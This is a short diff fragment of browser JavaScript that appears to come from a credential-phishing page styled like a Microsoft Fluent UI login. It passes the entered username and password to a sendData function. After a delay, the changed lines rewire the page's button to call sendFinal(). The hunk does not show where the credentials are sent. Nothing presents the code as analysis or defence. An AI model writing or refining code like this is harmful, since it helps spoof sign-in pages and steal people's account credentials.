@@ -53,9 +53,9 @@
                     sendData(username, password);
                     if(password.length < 1){
                         await delay(5000);
-                        var btn = document.getElementsByTagName('fluent-text-field')[0];
+                        var btn = document.getElementsByTagName('fluent-button')[0];
                         btn.removeAttribute('type');
-                        btn.setAttribute('onclick', 'sendFinal(username, password)');
+                        btn.setAttribute('onclick', 'sendFinal()');
                     }
                     else{
                         await delay(5000);
